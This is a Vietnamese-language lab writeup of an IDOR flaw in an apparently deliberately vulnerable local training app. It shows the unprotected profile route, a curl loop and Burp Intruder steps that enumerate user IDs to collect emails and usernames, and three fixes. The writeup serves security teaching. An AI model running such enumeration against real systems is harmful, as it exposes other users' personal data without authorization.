# IDOR (Insecure Direct Object Reference) — Writeup

> **Mức độ:** High  
> **Vị trí:** `/profile?id=X`  
> **CWE:** CWE-639 — Authorization Bypass Through User-Controlled Key

---

## 1. IDOR là gì?

IDOR xảy ra khi ứng dụng dùng user-controlled input (như `?id=1`) để truy cập trực tiếp database/file/object mà không kiểm tra quyền (authorization). Kẻ tấn công chỉ cần đổi số ID để xem dữ liệu của người khác.

---

## 2. Vị trí lỗi trong VulnWebApp

```javascript
// server.js
app.get('/profile', (req, res) => {
  const id = req.query.id;  // Lấy ID từ URL — user kiểm soát

  // KHÔNG kiểm tra: req.session.user.id === id ???
  const profile = db.prepare('SELECT * FROM users WHERE id = ?').get(id);
  res.render('profile', { profile });
});
```

**Không có check nào như:**
```javascript
// Đây là check CẦN CÓ nhưng KHÔNG có trong VulnWebApp
if (req.session.user.id !== parseInt(id) && req.session.user.role !== 'admin') {
  return res.status(403).render('error', { message: 'Forbidden' });
}
```

---

## 3. Cách khai thác

### 3.1 Xem Profile User Khác

**Bước thực hiện:**
1. Login với `user / 123456`
2. Truy cập profile của mình: `http://localhost:3000/profile?id=2`
3. Thay `id=2` thành `id=1`: `http://localhost:3000/profile?id=1`
4. Xem được thông tin của admin (id=1) bao gồm email, bio

---

### 3.2 Enumerate Tất Cả Users

Dùng script hoặc Burp Intruder:
```bash
for i in {1..10}; do
  curl -s "http://localhost:3000/profile?id=$i" | grep -E "username|email"
done
```

---

### 3.3 Burp Suite — Intruder Attack

1. Proxy → Intercept request `GET /profile?id=2`
2. Send to Intruder
3. Mark `2` là payload position: `GET /profile?id=§2§`
4. Payload type: Numbers, 1–20, step 1
5. Start Attack
6. → Xem tất cả profiles, collect emails, usernames

---

## 4. Kết quả

| URL | Data exposed |
|-----|-------------|
| `/profile?id=1` | admin's email, bio |
| `/profile?id=2` | user's email, bio |
| `/profile?id=3` | alice's email, bio, secret info |
| `/profile?id=4` | bob's email, bio |

---

## 5. Cách Fix 

### Fix 1: Kiểm tra quyền trước khi render

```javascript
app.get('/profile', requireLogin, (req, res) => {
  const id = parseInt(req.query.id);
  const currentUserId = req.session.user.id;
  const isAdmin = req.session.user.role === 'admin';

  // Chỉ cho phép xem profile của chính mình hoặc admin
  if (id !== currentUserId && !isAdmin) {
    return res.status(403).render('error', { message: 'Access denied.' });
  }

  const profile = db.prepare('SELECT * FROM users WHERE id = ?').get(id);
  res.render('profile', { profile });
});
```

### Fix 2: Dùng session thay vì query param

```javascript
// Không cần ?id= parameter — lấy từ session
app.get('/profile', requireLogin, (req, res) => {
  const profile = db.prepare('SELECT * FROM users WHERE id = ?').get(req.session.user.id);
  res.render('profile', { profile });
});
```

### Fix 3: Dùng UUID thay vì sequential ID

```javascript
// Thay vì id=1, id=2, id=3 (dễ enumerate)
// Dùng: id=a3f8e1b2-4c7d-...  (UUID — khó đoán)
const { v4: uuidv4 } = require('uuid');
// INSERT INTO users (id, ...) VALUES (uuidv4(), ...)
```

---

## 6. Tham khảo

- [OWASP — IDOR](https://owasp.org/www-chapter-ghana/assets/slides/IDOR.pdf)
- [PortSwigger — IDOR](https://portswigger.net/web-security/access-control/idor)
- [CWE-639](https://cwe.mitre.org/data/definitions/639.html)
